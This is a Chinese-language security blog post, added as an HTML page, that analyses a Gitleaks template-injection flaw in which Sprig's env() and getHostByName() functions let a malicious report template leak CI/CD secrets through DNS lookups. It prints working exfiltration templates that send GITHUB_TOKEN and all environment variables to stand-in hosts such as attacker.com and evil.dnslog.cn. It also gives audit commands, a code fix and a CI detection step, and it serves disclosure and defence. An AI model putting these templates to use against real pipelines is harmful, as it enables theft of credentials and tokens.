@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <link rel="icon" type="image/png" sizes="32x32" href="/assets/images/cat-final.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/assets/images/cat-final.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="/assets/images/cat-final.png">
+    <link rel="shortcut icon" href="/assets/images/cat-final.png">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>安全工具反噬：Sprig模板DNS外带窃取CI/CD密钥 — DARKSEC</title>
+<meta name="description" content="安全扫描工具是环境中密钥密度最高的进程——当它的模板引擎允许env()和getHostByName()时，攻击者通过恶意模板将所有CI/CD密钥外带。CVE-2026-63728深度分析。">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+<div class="container">
+  <header>
+    <a href="/" class="logo">DARK<span>SEC</span> <img src="/assets/images/cat-final.png" alt="cat" style="width:28px;height:28px;vertical-align:middle;margin-left:4px;"></a>
+    <nav>
+      <a href="/">首页</a>
+      <a href="/posts/" class="active">文章</a>
+      <a href="/tags/">标签</a>
+      <a href="/about.html">关于</a>
+    </nav>
+    <button class="mobile-menu" onclick="document.querySelector('nav').classList.toggle('show')">☰</button>
+  </header>
+
+  <main>
+    <a href="/" class="back-link">← 返回首页</a>
+
+    <article>
+      <div class="article-header">
+        <div class="category">◆ AI安全 / 供应链安全</div>
+        <h1>安全工具反噬：Sprig模板DNS外带窃取CI/CD密钥 🛡️🔓</h1>
+        <div class="article-meta">
+          <span>📅 2026-07-24</span>
+          <span>⏱ 14 min read</span>
+          <span>🏷 Gitleaks / 模板注入 / DNS外带 / CVE</span>
+        </div>
+      </div>
+
+      <div class="article-content">
+        <div class="toc">
+          <h4>◆ 目录</h4>
+          <ul>
+            <li><a href="#intro">漏洞概述</a></li>
+            <li><a href="#paradox">安全工具的信任悖论</a></li>
+            <li><a href="#sprig">Sprig模板引擎的致命FuncMap</a></li>
+            <li><a href="#exploit">Exploit构造：从模板到DNS外带</a></li>
+            <li><a href="#attack-chain">完整攻击链：CI/CD场景</a></li>
+            <li><a href="#audit">审计方法论</a></li>
+            <li><a href="#defense">防御策略</a></li>
+            <li><a href="#general">通用攻击模型</a></li>
+          </ul>
+        </div>
+
+        <h2 id="intro">🎯 漏洞概述</h2>
+        <p>安全扫描工具——Gitleaks、TruffleHog、Semgrep、Checkov、Trivy——是每个CI/CD pipeline的标配。它们运行时必然接触到环境中<strong>所有密钥和敏感信息</strong>：扫描的源码、环境变量、CI/CD凭证。</p>
+
+        <p>当这些工具的模板引擎包含<strong>非hermetic函数</strong>（可访问OS/网络的模板函数），攻击者可以通过构造恶意模板，将扫描发现的密钥直接<strong>DNS外带</strong>出去。</p>
+
+        <blockquote>
+          <p>🔥 <strong>核心洞察</strong>：安全工具是环境中<strong>密钥密度最高的进程</strong>——攻击安全工具不是「绕过检测」，而是「利用它发现的信息」。这是一次信任边界的彻底反转。</p>
+        </blockquote>
+
+        <div style="background:rgba(255,45,120,0.08);border:1px solid rgba(255,45,120,0.2);border-radius:8px;padding:16px;margin:20px 0;">
+          <p style="margin:0;"><strong>📋 CVE信息</strong></p>
+          <p style="margin:8px 0 0;font-size:0.9rem;">
+            <strong>CVE-2026-63728</strong> — Gitleaks Sprig TxtFuncMap → env()/getHostByName() → secret exfiltration via DNS<br>
+            CVSS 6.3 | 发现者: Fatih Çelik | NVD收录: 2026-07-21
+          </p>
+        </div>
+
+        <h2 id="paradox">🔄 安全工具的信任悖论</h2>
+        <p>传统攻击模型中，攻击者的目标是<strong>绕过安全检测</strong>——让恶意内容不被发现。但CVE-2026-63728揭示了一个完全不同的攻击方向：</p>
+
+        <pre><code>传统攻击模型：
+  攻击者 → 恶意内容 → [安全工具] → 检测/放行
+  目标：让恶意内容通过检测
+
+CVE-2026-63728攻击模型：
+  攻击者 → 恶意模板 → [安全工具] → 工具将发现的密钥外带
+  目标：利用工具本身作为数据泄露通道</code></pre>
+
+        <p>为什么安全工具是完美目标？三个原因：</p>
+
+        <ol>
+          <li><strong>密钥密度最高</strong> — 它的任务就是扫描代码中的密钥、凭证、敏感信息</li>
+          <li><strong>运行在高权限环境</strong> — CI/CD runner上通常有GITHUB_TOKEN、AWS_ACCESS_KEY_ID等高价值环境变量</li>
+          <li><strong>自动触发</strong> — 不需要人工干预，push代码就自动运行</li>
+        </ol>
+
+        <h2 id="sprig">⚙️ Sprig模板引擎的致命FuncMap</h2>
+        <p>Gitleaks支持通过<code>--report-template</code>参数指定自定义报告模板，底层使用Go的<strong>Sprig模板库</strong>。</p>
+
+        <p>问题出在Sprig提供的两种FuncMap：</p>
+
+        <pre><code>// 危险：TxtFuncMap() 包含所有函数
+// 包括 env(), expandenv(), getHostByName()
+template.Funcs(sprig.TxtFuncMap())
+
+// 安全：HermeticTxtFuncMap() 只包含纯函数
+// 不访问OS、网络、文件系统
+template.Funcs(sprig.HermeticTxtFuncMap())</code></pre>
+
+        <p>Gitleaks使用的<code>TxtFuncMap()</code>暴露了以下危险函数：</p>
+
+        <table style="width:100%;border-collapse:collapse;margin:16px 0;">
+          <tr style="border-bottom:1px solid var(--border);">
+            <td style="padding:8px;font-weight:bold;color:var(--neon-pink);">env "KEY"</td>
+            <td style="padding:8px;">读取环境变量值</td>
+          </tr>
+          <tr style="border-bottom:1px solid var(--border);">
+            <td style="padding:8px;font-weight:bold;color:var(--neon-pink);">expandenv "str"</td>
+            <td style="padding:8px;">展开字符串中的$ENV引用</td>
+          </tr>
+          <tr style="border-bottom:1px solid var(--border);">
+            <td style="padding:8px;font-weight:bold;color:var(--neon-pink);">getHostByName "host"</td>
+            <td style="padding:8px;">执行DNS查询（关键外带通道）</td>
+          </tr>
+        </table>
+
+        <blockquote>
+          <p>🎯 <strong>关键洞察</strong>：<code>TxtFuncMap()</code> vs <code>HermeticTxtFuncMap()</code> 的区别就是<strong>能否访问OS/网络</strong>。模板引擎的FuncMap选择是一个安全决策，但开发者往往不加区分地使用。</p>
+        </blockquote>
+
+        <h2 id="exploit">💥 Exploit构造：从模板到DNS外带</h2>
+
+        <h3>Step 1: 读取环境变量</h3>
+        <p>最简单的模板——直接读取CI/CD runner上的所有环境变量：</p>
+
+        <pre><code>{{ range $key, $val := env }}
+{{ $key }}={{ $val }}
+{{ end }}</code></pre>
+
+        <p>这会输出runner上的所有环境变量，包括GITHUB_TOKEN、AWS_SECRET_ACCESS_KEY等。</p>
+
+        <h3>Step 2: DNS外带单个密钥</h3>
+        <p>将环境变量的值编码进DNS查询：</p>
+
+        <pre><code>{{ getHostByName (print (env "GITHUB_TOKEN") ".attacker.com") }}</code></pre>
+
+        <p>当Gitleaks渲染模板时：</p>
+        <ol>
+          <li><code>env "GITHUB_TOKEN"</code> → 读取token值，如 <code>ghp_abc123</code></li>
+          <li><code>print ... ".attacker.com"</code> → 拼接为 <code>ghp_abc123.attacker.com</code></li>
+          <li><code>getHostByName</code> → 发起DNS查询到 <code>ghp_abc123.attacker.com</code></li>
+          <li>攻击者的DNS服务器收到查询，记录下token值</li>
+        </ol>
+
+        <h3>Step 3: 批量外带多个密钥</h3>
+        <pre><code>{{ range $key, $val := env }}
+{{ getHostByName (print $key "=" $val ".exfil.attacker.com") }}
+{{ end }}</code></pre>
+
+        <p>这个模板会对<strong>每个环境变量</strong>发起一次DNS查询，将所有密钥逐个外带。</p>
+
+        <h2 id="attack-chain">🔗 完整攻击链：CI/CD场景</h2>
+        <p>攻击者<strong>不需要运行Gitleaks</strong>——只需要在共享仓库提交恶意模板文件：</p>
+
+        <pre><code>攻击者视角：
+
+1. Fork目标仓库（或在共享仓库有提交权限）
+
+2. 创建恶意模板文件 .gitleaks.tpl：
+   ┌──────────────────────────────────────────┐
+   │ {{ range $k, $v := env }}               │
+   │ {{ getHostByName                        │
+   │   (print $k "=" $v ".evil.dnslog.cn")}} │
+   │ {{ end }}                                │
+   └──────────────────────────────────────────┘
+
+3. 提交并Push到仓库
+
+4. CI/CD pipeline自动触发：
+   - GitHub Actions checkout代码
+   - 运行 gitleaks --report-template .gitleaks.tpl
+   - Gitleaks渲染模板，执行DNS查询
+   - 所有环境变量通过DNS外带
+
+5. 攻击者在DNS服务器上收集到：
+   - GITHUB_TOKEN=ghp_xxxxxxxxxxxx
+   - AWS_ACCESS_KEY_ID=AKIAxxxxxxxxxxxx
+   - NPM_TOKEN=npm_xxxxxxxxxxxx
+   - ...</code></pre>
+
+        <blockquote>
+          <p>🔥 <strong>最致命的点</strong>：攻击者只需要提交一个<strong>模板文件</strong>到仓库——它看起来像正常的配置文件，不会触发任何安全告警。而触发外带的是CI/CD pipeline的<strong>自动运行</strong>。</p>
+        </blockquote>
+
+        <h2 id="audit">🔍 审计方法论</h2>
+        <p>如何发现使用了不安全FuncMap的安全工具？</p>
+
+        <h3>1. 搜索FuncMap选择</h3>
+        <pre><code># 搜索使用了TxtFuncMap而非HermeticTxtFuncMap的代码
+grep -rn "TxtFuncMap\|FuncMap" --include="*.go" .
+
+# 关键区别：
+# sprig.TxtFuncMap()         → 危险（含env/getHostByName）
+# sprig.HermeticTxtFuncMap() → 安全（纯函数）</code></pre>
+
+        <h3>2. 测试模板文件可控性</h3>
+        <pre><code># 检查模板文件是否在仓库中（可被攻击者修改）
+find . -name "*.tpl" -o -name "*.tmpl" -o -name "*template*"
+
+# 检查CI配置中是否引用了自定义模板
+grep -rn "template\|tpl\|tmpl" .github/workflows/ .gitlab-ci.yml</code></pre>
+
+        <h3>3. 验证危险函数可用性</h3>
+        <pre><code># 创建测试模板验证env函数是否可用
+cat > /tmp/test.tpl &lt;&lt; 'EOF'
+{{ env "HOME" }}
+EOF
+
+gitleaks detect --report-template /tmp/test.tpl
+# 如果输出了HOME目录的值，说明env函数可用 → 漏洞</code></pre>
+
+        <h2 id="defense">🛡️ 防御策略</h2>
+
+        <h3>对工具开发者</h3>
+        <pre><code>// 必须使用Hermetic版本
+template.Funcs(sprig.HermeticTxtFuncMap())
+// 而非
+template.Funcs(sprig.TxtFuncMap())  // ❌ 危险</code></pre>
+
+        <h3>对CI/CD使用者</h3>
+        <ol>
+          <li><strong>模板文件白名单</strong> — 只允许从受信任的路径加载模板</li>
+          <li><strong>环境变量最小化</strong> — CI/CD步骤中只暴露必要的环境变量</li>
+          <li><strong>DNS出站监控</strong> — 监控runner的DNS查询异常</li>
+          <li><strong>模板内容审计</strong> — 在CI中添加步骤检查模板是否包含<code>env</code>、<code>getHostByName</code>等危险函数</li>
+        </ol>
+
+        <pre><code># CI中检测恶意模板的前置步骤
+- name: Check template safety
+  run: |
+    if grep -qE 'env|getHostByName|expandenv|getHostByName' .gitleaks.tpl; then
+      echo "⚠️ Template contains dangerous functions!"
+      exit 1
+    fi</code></pre>
+
+        <h2 id="general">🌊 通用攻击模型：模板引擎FuncMap审计</h2>
+        <p>这个漏洞不仅限于Gitleaks/Sprig——任何使用模板引擎的安全工具都值得审计：</p>
+
+        <table style="width:100%;border-collapse:collapse;margin:16px 0;">
+          <tr style="border-bottom:1px solid var(--border);">
+            <td style="padding:8px;font-weight:bold;">工具</td>
+            <td style="padding:8px;font-weight:bold;">模板引擎</td>
+            <td style="padding:8px;font-weight:bold;">风险函数</td>
+          </tr>
+          <tr style="border-bottom:1px solid var(--border);">
+            <td style="padding:8px;">Gitleaks</td>
+            <td style="padding:8px;">Go sprig</td>
+            <td style="padding:8px;color:var(--neon-pink);">env, getHostByName</td>
+          </tr>
+          <tr style="border-bottom:1px solid var(--border);">
+            <td style="padding:8px;">Trivy</td>
+            <td style="padding:8px;">Go text/template</td>
+            <td style="padding:8px;color:var(--neon-yellow);">需审计FuncMap</td>
+          </tr>
+          <tr style="border-bottom:1px solid var(--border);">
+            <td style="padding:8px;">Semgrep</td>
+            <td style="padding:8px;">Python Jinja2</td>
+            <td style="padding:8px;color:var(--neon-yellow);">需审计Sandbox</td>
+          </tr>
+          <tr style="border-bottom:1px solid var(--border);">
+            <td style="padding:8px;">Checkov</td>
+            <td style="padding:8px;">Python</td>
+            <td style="padding:8px;color:var(--neon-yellow);">需审计输出格式</td>
+          </tr>
+          <tr>
+            <td style="padding:8px;">WAF自定义日志</td>
+            <td style="padding:8px;">各厂商</td>
+            <td style="padding:8px;color:var(--neon-yellow);">需审计格式化函数</td>
+          </tr>
+        </table>
+
+        <blockquote>
+          <p>🎯 <strong>审计原则</strong>：找到所有使用模板引擎的安全工具 → 检查其FuncMap是否hermetic → 测试<code>env</code>/<code>getHostByName</code>/<code>file</code>类函数是否可用。安全性工具的信任边界是反向的——普通应用被攻击者渗透是信息流入，而安全工具被渗透是<strong>它发现的信息流出</strong>。</p>
+        </blockquote>
+
+        <h3>防御检查清单</h3>
+        <pre><code>□ 所有安全工具的模板引擎使用HermeticFuncMap
+□ 模板文件不在用户可提交的仓库中
+□ CI/CD环境变量遵循最小权限原则
+□ Runner的DNS出站有监控告警
+□ 模板加载前做危险函数扫描
+□ 安全工具版本已更新到修复版本</code></pre>
+
+        <div class="article-tags">
+          <span class="tag pink">模板注入</span>
+          <span class="tag">DNS外带</span>
+          <span class="tag purple">CVE-2026-63728</span>
+          <span class="tag yellow">CI/CD安全</span>
+          <span class="tag">供应链安全</span>
+        </div>
+      </div>
+    </article>
+  </main>
+
+  <footer>
+      <div style="text-align:center;margin-bottom:16px;">
+          <img src="/assets/images/cat-final.png" alt="cat" style="width:24px;height:24px;vertical-align:middle;opacity:0.7;">
+          <span style="color:var(--text-dim);margin:0 8px;">‧</span>
+          <img src="/assets/images/cat-final.png" alt="cat" style="width:24px;height:24px;vertical-align:middle;opacity:0.7;">
+          <span style="color:var(--text-dim);margin:0 8px;">‧</span>
+          <img src="/assets/images/cat-final.png" alt="cat" style="width:24px;height:24px;vertical-align:middle;opacity:0.7;">
+        </div>
+    <div class="footer-content">
+      <p>© 2026 <span class="neon-text">DARKSEC</span> CYBERCAT SECURITY LAB <img src="/assets/images/cat-final.png" alt="cat" style="width:1.2em;height:1.2em;vertical-align:middle;"></p>
+      <p class="quote">「 漏洞不会消失，只会转移 nya~ 」</p>
+      <div class="links">
+        <a href="https://github.com/deft-dream" target="_blank">GitHub</a>
+        <span>·</span>
+        <a href="mailto:s815887892@163.com">Contact</a>
+      </div>
+    </div>
+  </footer>
+</div>
+</body>
+</html>
